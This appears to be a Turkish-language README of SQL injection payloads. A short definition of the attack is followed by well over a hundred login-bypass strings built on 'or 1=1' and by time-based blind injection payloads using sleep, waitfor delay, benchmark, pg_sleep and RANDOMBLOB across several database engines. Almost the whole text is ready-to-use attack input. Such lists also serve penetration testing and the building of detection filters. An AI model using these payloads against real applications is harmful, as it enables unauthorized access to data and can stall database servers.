# SQL-PAYLOAD
----------------------------------------------------------------------------------------------------------------------------------
# SQL PAYLOAD NEDİR NERELERDE KULLANILIR ?
SQL Injection, saldırganın, bir uygulamanın kötü amaçlı SQL enjeksiyon yüklerini enjekte ederek veritabanına yaptığı sorgulara müdahale etmesine izin vererek, saldırganların, görememeleri gereken verileri görüntülemesine olanak tanıyan bir web güvenlik açığını temsil eder.
-
# PAYLOADLAR
______________________________________________________________________________________________________________________
+ admin"or 1=1 or ""="
+ admin") or ("1"="1"--
+ ''Or'='Or''
+ anything' OR 'x'='x
+ 1'or'1'='1
+ ' or 1=1 or ''='
+ or 1=1 or "=
+ ' OR ''='
+ '' OR ''=''
+ 'OR''='
+ hey' or 1=1–
+ ''Or 1 = 1'
+ ' or 1=1-- 
+ or 1=1--
+ " or 1=1--
+ or 1=1--
+ 'or 'a'='a
+ or ""a""=""a"
+ ') or ('a'='a
+ %23 1
+ hi") or ("a"="a
+ 'hi' or 'x'='x';
+ 2 or 1=1 %23%0A1
+ %23%0A1
+ desc %23
+ 23%
+ x' or 1=1 or 'x'='y
+ \x27\x4F\x52 SELECT *
+ \x27\x6F\x72 SELECT *
+ 'or select *
+ admin'--
+ )) or ((x"))=(("x
+  or "+
+ admin"or 1=1 or ""="
+ admin") or ("1"="1"--
+ ' or "='
+ '=' 'or'
+ 'or'1'='1 (güncel)
+ or 1=1
+ or 1=1–
+ or 1=1#
+ or 1=1/*
+ admin' —
+ admin' #
+ admin'/*
+ admin' or '1'='1
+ admin' or '1'='1'–
+ admin' or '1'='1'#
+ admin' or '1'='1'/*
+ admin'or 1=1 or "='
+ admin' or 1=1
+ admin' or 1=1–
+ admin' or 1=1#
+ admin' or 1=1/*
+ admin') or ('1'='1
+ admin') or ('1'='1'–
+ admin') or ('1'='1'#
+ admin') or ('1'='1'/*
+ admin') or '1'='1
+ admin') or '1'='1'–
+ admin') or '1'='1'#
+ admin') or '1'='1'/*
+ admin" —
+ admin" #
+ admin"/*
+ admin" or "1"="1
+ admin" or "1"="1¨–
+ admin" or "1"="1¨#
+ admin" or "1"="1¨/*
+ admin"or 1=1 or ""="
+ admin" or 1=1
+ admin" or 1=1–
+ admin" or 1=1#
+ admin" or 1=1/*
+ admin") or ("1¨="1
+ admin") or ("1¨="1¨–
+ admin") or ("1¨="1¨#
+ admin") or ("1¨="1¨/*
+ admin") or "1"="1
+ admin") or "1"="1¨–
+ admin") or "1"="1¨#
+ admin") or "1"="1¨/*
+ ' or true–
+ ') or true–
+ ') or (")=('
+ ') or 1–
+ ') or ('x')=('
+ " or true–
+ or """"="""
+ " or 1–
+ or ""x""="""
+ ") or true–
+ ) or ("""")=("""
+ ") or 1–
+ ) or (""x"")=("""
+ ')) or true–
+ ')) or (("))=(('
+ ')) or 1–
+ ')) or (('x'))=(('
+ '-'
+ '+'
+ '&amp;'
+ '^'
+ '*'
+ ' or "-'
+ ' or "+'
+ ' or "&amp;'
+ ' or "^'
+ ' or "*'
+ -
+ +
+ &amp;
+ ^
+ *
+ or "-
+ or "+
+ or "&amp;
+ or "^
+ or "*
+ or true–
+ " or true–
+ ' or true–
+ ) or true–"
+ ') or true–
+ ' or 'x'='x
+ ') or ('x')=('x
+ ')) or (('x'))=(('x
+  or x"="x
+ ) or (x")=("x
+ )) or ((x"))=(("

______________________________________________________________________________________________________
# GENERİC TİME BASED SQL İNJECTİON PAYLOADS

+ sleep(5)#
+ 1 or sleep(5)#
+ " or sleep(5)#
+ ' or sleep(5)#
+ " or sleep(5)="
+ ' or sleep(5)='
+ 1) or sleep(5)#
+ ") or sleep(5)="
+ ') or sleep(5)='
+ 1)) or sleep(5)#
+ ")) or sleep(5)="
+ ')) or sleep(5)='
+ ;waitfor delay '0:0:5'--
+ );waitfor delay '0:0:5'--
+ ';waitfor delay '0:0:5'--
+ ";waitfor delay '0:0:5'--
+ ');waitfor delay '0:0:5'--
+ ");waitfor delay '0:0:5'--
+ ));waitfor delay '0:0:5'--
+ '));waitfor delay '0:0:5'--
+ "));waitfor delay '0:0:5'--
+ benchmark(10000000,MD5(1))#
+ 1 or benchmark(10000000,MD5(1))#
+ " or benchmark(10000000,MD5(1))#
+ ' or benchmark(10000000,MD5(1))#
+ 1) or benchmark(10000000,MD5(1))#
+ ") or benchmark(10000000,MD5(1))#
+ ') or benchmark(10000000,MD5(1))#
+ 1)) or benchmark(10000000,MD5(1))#
+ ")) or benchmark(10000000,MD5(1))#
+ ')) or benchmark(10000000,MD5(1))#
+ pg_sleep(5)--
+ 1 or pg_sleep(5)--
+ " or pg_sleep(5)--
+ ' or pg_sleep(5)--
+ 1) or pg_sleep(5)--
+ ") or pg_sleep(5)--
+ ') or pg_sleep(5)--
+ 1)) or pg_sleep(5)--
+ ")) or pg_sleep(5)--
+ ')) or pg_sleep(5)--
+ AND (SELECT * FROM (SELECT(SLEEP(5)))bAKL) AND 'vRxe'='vRxe
+ AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'='
+ AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)
+ AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)--
+ AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#
+ SLEEP(5)#
+ SLEEP(5)--
+ SLEEP(5)="
+ SLEEP(5)='
+ or SLEEP(5)
+ or SLEEP(5)#
+ or SLEEP(5)--
+ or SLEEP(5)="
+ or SLEEP(5)='
+ waitfor delay '00:00:05'
+ waitfor delay '00:00:05'--
+ waitfor delay '00:00:05'#
+ benchmark(50000000,MD5(1))
+ benchmark(50000000,MD5(1))--
+ benchmark(50000000,MD5(1))#
+ or benchmark(50000000,MD5(1))
+ or benchmark(50000000,MD5(1))--
+ or benchmark(50000000,MD5(1))#
+ pg_SLEEP(5)
+ pg_SLEEP(5)--
+ pg_SLEEP(5)#
+ or pg_SLEEP(5)
+ or pg_SLEEP(5)--
+ or pg_SLEEP(5)#
+ '\"
+ AnD SLEEP(5)
+ AnD SLEEP(5)--
+ AnD SLEEP(5)#
+ &&SLEEP(5)
+ &&SLEEP(5)--
+ &&SLEEP(5)#
+ ' AnD SLEEP(5) ANd '1
+ '&&SLEEP(5)&&'1
+ ORDER BY SLEEP(5)
+ ORDER BY SLEEP(5)--
+ ORDER BY SLEEP(5)#
+ (SELECT * FROM (SELECT(SLEEP(5)))ecMj)
+ (SELECT * FROM (SELECT(SLEEP(5)))ecMj)#
+ (SELECT * FROM (SELECT(SLEEP(5)))ecMj)--
+ +benchmark(3200,SHA1(1))+'
+ + SLEEP(10) + '
+ RANDOMBLOB(500000000/2)
+ AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(500000000/2))))
+ RANDOMBLOB(1000000000/2)
+ AND 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+ OR 2947=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))
+ SLEEP(1)/*' or SLEEP(1) or '" or SLEEP(1) or "*/
-----------------------------------------------------------------------------------------------------------------------


ŞİKAYET VE ÖNERİLERİNİZ İÇİN :
* E-POSTA : tegmen.py@gmail.com
